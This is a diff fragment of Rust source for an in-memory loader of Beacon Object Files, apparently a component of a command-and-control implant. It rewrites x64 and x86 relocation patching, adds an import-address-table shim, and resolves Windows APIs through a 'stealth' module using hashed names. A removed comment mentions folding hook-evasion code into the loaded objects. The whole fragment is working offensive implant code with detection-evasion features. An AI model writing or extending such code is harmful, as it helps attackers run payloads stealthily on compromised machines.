-                // 内部段引用 (支持将规避 Hook 合并进 BOF)
-                // 即使是以 __imp_ 开头的符号，如果它在内部定义了，也优先使用内部地址
-                let base = *section_map.get(&(symbol.section_number as u16)).unwrap_or(&0);
-                if base == 0 { continue; }
+                // Internal section ref (prefer over import even if named __imp_*)
+                let base = *section_map
+                    .get(&(symbol.section_number as u16))
+                    .unwrap_or(&0);
+                if base == 0 {
+                    continue;
+                }
                 base + symbol.value as usize
             } else if name.starts_with("__imp_") {
-                Self::resolve_external(&name)
-            } else if name.starts_with("Beacon") {
-                Self::resolve_internal_beacon(&name)
+                // Indirect import: reloc target = address of IAT slot holding fn VA
+                let fn_addr = Self::resolve_symbol_fn(&name);
+                if fn_addr == 0 {
+                    continue;
+                }
+                let slot = iat.slot_for(&name, fn_addr);
+                if slot == 0 {
+                    continue;
+                }
+                slot
+            } else if name.starts_with("Beacon")
+                || name.trim_start_matches('_').starts_with("Beacon")
+            {
+                // Direct Beacon API reference
+                Self::resolve_symbol_fn(&name)
             } else {
-                0
+                // Other undefined symbols — try as import; use IAT for safety
+                let fn_addr = Self::resolve_symbol_fn(&name);
+                if fn_addr == 0 {
+                    0
+                } else if name.contains('$') || name.starts_with('_') {
+                    // MODULE$API style often used as direct; still prefer IAT for consistency
+                    iat.slot_for(&name, fn_addr)
+                } else {
+                    fn_addr
+                }
             };
 
-            if target_addr == 0 { continue; }
+            if target_addr == 0 {
+                continue;
+            }
 
             let patch_addr = section_base.add(reloc.virtual_address as usize);
+            let reloc_type = reloc.typ;
 
-            match reloc.typ {
-                IMAGE_REL_AMD64_REL32 => { // 32位相对地址
-                    let offset = (target_addr as isize) - (patch_addr as isize) - 4;
+            match reloc_type {
+                IMAGE_REL_AMD64_REL32
+                | IMAGE_REL_AMD64_REL32_1
+                | IMAGE_REL_AMD64_REL32_2
+                | IMAGE_REL_AMD64_REL32_3
+                | IMAGE_REL_AMD64_REL32_4
+                | IMAGE_REL_AMD64_REL32_5 => {
+                    // type 4 → extra 0; type 5 → extra 1; … type 9 → extra 5
+                    let extra = (reloc_type as isize) - (IMAGE_REL_AMD64_REL32 as isize);
+                    let offset = (target_addr as isize) - (patch_addr as isize) - 4 - extra;
                     *(patch_addr as *mut i32) = offset as i32;
                 }
-                IMAGE_REL_AMD64_ADDR64 => { // 64位绝对地址
+                IMAGE_REL_AMD64_ADDR64 => {
                     *(patch_addr as *mut u64) = target_addr as u64;
                 }
-                IMAGE_REL_AMD64_ADDR32 => { // 32位绝对地址
+                IMAGE_REL_AMD64_ADDR32 => {
                     *(patch_addr as *mut u32) = target_addr as u32;
                 }
-                IMAGE_REL_AMD64_ADDR32NB => { // 32位相对于镜像基址
-                    // 对于 BOF，通常不需要处理这种类型
+                IMAGE_REL_AMD64_ADDR32NB => {
                     warn!("[!] IMAGE_REL_AMD64_ADDR32NB not fully supported");
                 }
                 _ => {
-                    let reloc_type = reloc.typ; // 复制字段以避免 packed struct 对齐问题
                     warn!("[!] Unknown x64 relocation type: {}", reloc_type);
                 }
             }
@@ -728,13 +955,13 @@ impl BofLoader {
     }
 
     /// 核心符号修复逻辑 (Symbol Patching) - x86 版本
-    #[allow(dead_code)]
     unsafe fn patch_symbols_x86(
         section_base: *mut u8,
         relocs: &[CoffRelocation],
         symbols: &[CoffSymbol],
         string_table: *const u8,
         section_map: &std::collections::HashMap<u16, usize>,
+        iat: &mut IatTable,
     ) {
         for reloc in relocs {
             let idx = reloc.symbol_table_index as usize;
@@ -750,34 +977,44 @@ impl BofLoader {
             let name = Self::get_symbol_name(symbol, string_table);
 
             let target_addr = if symbol.section_number > 0 {
-                let base = *section_map.get(&(symbol.section_number as u16)).unwrap_or(&0);
-                if base == 0 { continue; }
+                let base = *section_map
+                    .get(&(symbol.section_number as u16))
+                    .unwrap_or(&0);
+                if base == 0 {
+                    continue;
+                }
                 base + symbol.value as usize
             } else if name.starts_with("__imp_") {
-                Self::resolve_external(&name)
-            } else if name.starts_with("Beacon") {
-                Self::resolve_internal_beacon(&name)
+                let fn_addr = Self::resolve_symbol_fn(&name);
+                if fn_addr == 0 {
+                    continue;
+                }
+                iat.slot_for(&name, fn_addr)
+            } else if name.starts_with("Beacon") || name.starts_with("_Beacon") {
+                Self::resolve_symbol_fn(&name)
             } else {
-                0
+                Self::resolve_symbol_fn(&name)
             };
 
-            if target_addr == 0 { continue; }
+            if target_addr == 0 {
+                continue;
+            }
 
             let patch_addr = section_base.add(reloc.virtual_address as usize);
 
             match reloc.typ {
-                IMAGE_REL_I386_DIR32 => { // 32位绝对地址
+                IMAGE_REL_I386_DIR32 => {
                     *(patch_addr as *mut u32) = target_addr as u32;
                 }
-                IMAGE_REL_I386_REL32 => { // 32位相对地址
+                IMAGE_REL_I386_REL32 => {
                     let offset = (target_addr as isize) - (patch_addr as isize) - 4;
                     *(patch_addr as *mut i32) = offset as i32;
                 }
-                IMAGE_REL_I386_DIR32NB => { // 32位相对于镜像基址
+                IMAGE_REL_I386_DIR32NB => {
                     warn!("[!] IMAGE_REL_I386_DIR32NB not fully supported");
                 }
                 _ => {
-                    let reloc_type = reloc.typ; // 复制字段以避免 packed struct 对齐问题
+                    let reloc_type = reloc.typ;
                     warn!("[!] Unknown x86 relocation type: {}", reloc_type);
                 }
             }
@@ -806,13 +1043,13 @@ impl BofLoader {
             let api_name = &clean_name[pos + 1..];
 
             unsafe {
-                let h_module = crate::stealth::get_module_base(
-                    crate::stealth::hash_module_name(module_name.as_bytes())
-                );
+                let h_module = crate::stealth::get_module_base(crate::stealth::hash_module_name(
+                    module_name.as_bytes(),
+                ));
                 if h_module != 0 {
                     if let Some(addr) = crate::stealth::get_api_addr(
                         h_module,
-                        crate::stealth::hash_api_name(api_name.as_bytes())
+                        crate::stealth::hash_api_name(api_name.as_bytes()),
                     ) {
                         // 缓存结果
                         if let Ok(mut cache) = SYMBOL_CACHE.lock() {
@@ -851,14 +1088,14 @@ impl BofLoader {
 
         unsafe {
             for module in &common_modules {
-                let h_module = crate::stealth::get_module_base(
-                    crate::stealth::hash_module_name(module.as_bytes())
-                );
+                let h_module = crate::stealth::get_module_base(crate::stealth::hash_module_name(
+                    module.as_bytes(),
+                ));
                 if h_module != 0 {
                     // 尝试原始名称
                     if let Some(addr) = crate::stealth::get_api_addr(
                         h_module,
-                        crate::stealth::hash_api_name(api_name.as_bytes())
+                        crate::stealth::hash_api_name(api_name.as_bytes()),
                     ) {
                         debug!("[+] Resolved {} -> 0x{:X} (from {})", name, addr, module);
                         // 缓存结果
@@ -872,9 +1109,12 @@ impl BofLoader {
                     let ansi_name = format!("{}A", api_name);
                     if let Some(addr) = crate::stealth::get_api_addr(
                         h_module,
-                        crate::stealth::hash_api_name(ansi_name.as_bytes())
+                        crate::stealth::hash_api_name(ansi_name.as_bytes()),
                     ) {
-                        debug!("[+] Resolved {} -> 0x{:X} (from {}, ANSI)", name, addr, module);
+                        debug!(
+                            "[+] Resolved {} -> 0x{:X} (from {}, ANSI)",
+                            name, addr, module
+                        );
                         // 缓存结果
                         if let Ok(mut cache) = SYMBOL_CACHE.lock() {
                             cache.insert(name.to_string(), addr);
@@ -886,9 +1126,12 @@ impl BofLoader {
                     let wide_name = format!("{}W", api_name);
                     if let Some(addr) = crate::stealth::get_api_addr(
                         h_module,
-                        crate::stealth::hash_api_name(wide_name.as_bytes())
+                        crate::stealth::hash_api_name(wide_name.as_bytes()),
                     ) {
-                        debug!("[+] Resolved {} -> 0x{:X} (from {}, Unicode)", name, addr, module);
+                        debug!(
+                            "[+] Resolved {} -> 0x{:X} (from {}, Unicode)",
+                            name, addr, module
+                        );
                         // 缓存结果
                         if let Ok(mut cache) = SYMBOL_CACHE.lock() {
                             cache.insert(name.to_string(), addr);
@@ -939,9 +1182,13 @@ impl BofLoader {
     unsafe fn get_symbol_name(sym: &CoffSymbol, str_table: *const u8) -> String {
         if sym.name[0] == 0 && sym.name[1] == 0 && sym.name[2] == 0 && sym.name[3] == 0 {
             let offset = u32::from_le_bytes([sym.name[4], sym.name[5], sym.name[6], sym.name[7]]);
-            std::ffi::CStr::from_ptr(str_table.add(offset as usize) as *const i8).to_string_lossy().into_owned()
+            std::ffi::CStr::from_ptr(str_table.add(offset as usize) as *const i8)
+                .to_string_lossy()
+                .into_owned()
         } else {
-            String::from_utf8_lossy(&sym.name).trim_matches('\0').to_string()
+            String::from_utf8_lossy(&sym.name)
+                .trim_matches('\0')
+                .to_string()
         }
     }
 }
